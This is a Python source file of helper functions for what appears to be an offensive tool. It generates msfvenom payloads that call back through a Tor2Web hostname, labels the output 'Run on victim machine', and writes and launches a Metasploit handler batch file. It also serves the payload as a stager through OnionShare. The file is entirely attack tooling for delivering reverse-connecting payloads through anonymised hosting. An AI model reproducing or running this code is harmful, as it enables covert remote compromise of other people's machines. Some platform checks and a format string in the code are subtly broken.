import os
import sys
import shlex
import subprocess


def generate_rc_payload(hostname, payload, output):
    """Generating msfvenom payload"""
    # Check if msfvenom is installed
    rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find msfvenom! Exiting..')
        exit(0)
    print(" * Generating msfvenom %s payload.." % payload)
    print('\n')
    # Append .ws Tor2Web extension
    lhost = hostname + ".ws"
    # Generate payload
    msfvenom_cmd = "msfvenom -p %s LHOST=%s LPORT=80 > %s" % (payload, lhost, output)
    subprocess.call(msfvenom_cmd, stdout=subprocess.PIPE, shell=True)
    print(" * payload generated in %s - Run on victim machine" % output)


def generate_msfc_batch(exploit, payload, lhost, lport):
    """Generate metasploit batch .rc file"""
    with open(os.getcwd() + '/public/msfconsole.rc', 'w') as f:
        f.write("use %s\n" % exploit)
        f.write("set PAYLOAD " + os.getcwd() + "/public/%s\n" % payload)
        f.write("set LHOST %s\n" % lhost)
        f.write("set LPORT %d\n" % lport)
        f.write("exploit -jz\n")

    print(" * batch file generated in " + os.getcwd() + "/public/msfconsole.rc")
    print('\n')
    # Asking for valid response
    while True:
        response = input("[!] Start msfconsole now? [yes/no] ")
        if not response.isalpha():
            continue
        if response == 'yes' or response == 'no':
            break

    if response == 'yes':
        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r ' + os.getcwd() + '/public/msfconsole.rc'])


def generate_onionshare_stager(outfile):
    onionshare = 'onionshare-cli' if sys.platform == 'nt' else 'onionshare'
    rc = subprocess.call(['which', onionshare], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find ' + onionshare + ' ! Exiting...')
        exit(0)
    else:
        # Start OnionShare FTP
        print(' * Starting OnionShare solution...')
        # os.system('onionshare-cli %s --public --website --disable_csp --receive --data-dir %s' % (outfile, ))
        if sys.platform == 'nt':
            print('onionshare-cli %s --public --website --disable_csp --receive --data-dir %s' % outfile)
            args = shlex.split('onionshare-cli ' + outfile + ' --website --public --disable_csp')
        else:
            args = shlex.split('onionshare ' + outfile + ' --website')
        subprocess.Popen(args)
